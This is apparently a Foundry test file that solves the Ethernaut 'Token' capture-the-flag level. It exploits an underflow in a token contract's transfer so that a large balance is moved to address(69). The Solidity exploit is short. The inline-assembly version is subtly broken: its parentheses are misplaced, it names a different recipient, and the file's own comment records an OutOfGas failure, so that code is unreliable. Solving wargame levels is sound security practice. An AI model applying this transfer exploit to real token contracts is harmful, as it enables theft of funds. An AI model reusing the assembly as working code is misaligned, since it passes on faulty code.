// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {IToken} from "ethernaut/5IToken.sol";
import {BaseTest} from "./BaseTest.t.sol";

contract TokenTest is BaseTest {
    IToken public tokenInstance = IToken(0x8158081EC3e5359A5D2A667379E50AFF4147F791);

    function setUp() public override {
        super.setUp();
    }

    function exploitSol() internal override {
        tokenInstance.transfer(address(69), 1 << 128);
    }

    function testExploitSol() public override {
        exploitSol();
        assertEq(tokenInstance.balanceOf(address(69)), 1 << 128);
    }

    function exploitYul() internal override {
        assembly {
            mstore(0, 0xa9059cbb)
            mstore(32, address())
            mstore(64, 0x100000000000000000000000000000000)
            pop(call(gas()), sload(tokenInstance.slot), 0, 28, 68, 0, 0))
        }
    }

    function testExploitYul() public override {
        exploitYul();
        // assertEq(tokenInstance.balanceOf(address(69)), 1 << 128); //! [FAIL. Reason: EvmError: OutOfGas] testExploitYul() (gas: 9223372036854754743)

    }
}
